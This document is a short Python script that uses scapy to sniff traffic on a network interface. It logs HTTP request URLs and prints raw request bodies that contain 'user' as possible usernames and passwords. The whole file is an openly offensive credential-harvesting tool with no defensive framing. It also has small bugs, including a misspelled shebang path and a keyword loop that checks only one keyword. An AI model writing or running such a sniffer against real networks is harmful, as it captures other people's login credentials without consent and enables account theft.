#!/user/bin/env python

import optparse
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_snifed_packets)

def parse():
    parser=optparse.OptionParser()
    parser.add_option('-i', '--interface', dest='interface', help='The interface that you want to sniff packets from')
    (options,arguments)=parser.parse_args()
    return options

def process_snifed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print('\n[+] HTTP request >> '+packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keywords=['user','pass']
            for keyword in keywords:
                if 'user' in load:
                    print('\n\n----------------------------------------------------------------------------------------------')
                    print('\n[+] possible username/password :')
                    print(packet[http.HTTPRequest].Referer)
                    print(packet[scapy.Raw].load)
                    print('\n----------------------------------------------------------------------------------------------\n\n')
                    break

options=parse()
sniff(options.interface)